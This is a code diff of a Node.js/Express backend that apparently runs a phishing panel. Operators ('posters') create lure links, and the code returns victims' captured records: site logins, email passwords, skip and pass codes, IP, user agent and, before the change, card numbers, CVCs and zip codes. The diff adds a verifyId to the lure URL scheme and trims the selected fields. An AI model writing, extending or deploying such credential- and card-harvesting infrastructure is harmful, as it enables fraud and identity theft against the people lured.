@@ -335,7 +335,7 @@ export const id_card = async (req, res) => {
 
 export const poster_add = async (req, res) => {
 
-    const { username, password, links, id, posterId } = req.body
+    const { username, password, links, id, posterId,verifyId } = req.body
 
 
     try {
@@ -359,7 +359,7 @@ export const poster_add = async (req, res) => {
        
 
         const poster = await Poster.create({
-            username, password, links, posterId,
+            username, password, links, posterId,verifyId,
 
             root: user._id
 
@@ -626,9 +626,9 @@ export const poster_details =async  (req, res) => {
     try {
 
 
-        const poster = await Poster.findOne({ _id: id }).select('username password posterId links createdAt')
+        const poster = await Poster.findOne({ _id: id }).select('username password posterId links verifyId createdAt')
        
-        const details =await Info.find({ root: id }).select('site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent wrongPassword validity address cardNumber cvc name zipCode createdAt').sort({ createdAt: -1 })
+        const details =await Info.find({ root: id }).select('site email password skipcode ip agent status createdAt').sort({ createdAt: -1 })
         // const newdata = {...poster, details: details }
         // console.log(newdata)
         return res.status(200).json({ data: {...poster, details: details }})
@@ -700,8 +700,9 @@ if(admin == 1){
 
 export const site_exist =async (req, res) => {
 
-    const { site,check, adminId, posterId,device} = req.params
-    const siteName =  check == 'verify' ? "https://" + site + "/" + "verify" +  "/" + adminId + "/" + posterId : "https://" + site + "/" + "w4m" +  "/" + adminId + "/" + posterId
+    const { site,adminId, posterId,verifyId,device} = req.params
+    // const siteName =    "https://" + site + "/" + adminId + "/" + posterId  + "/" + verifyId 
+    const siteName =    "https://" + site   +  "/" + adminId + "/" + posterId  + "/" + verifyId 
    
     // return res.status(200).json({ success: siteName })
 
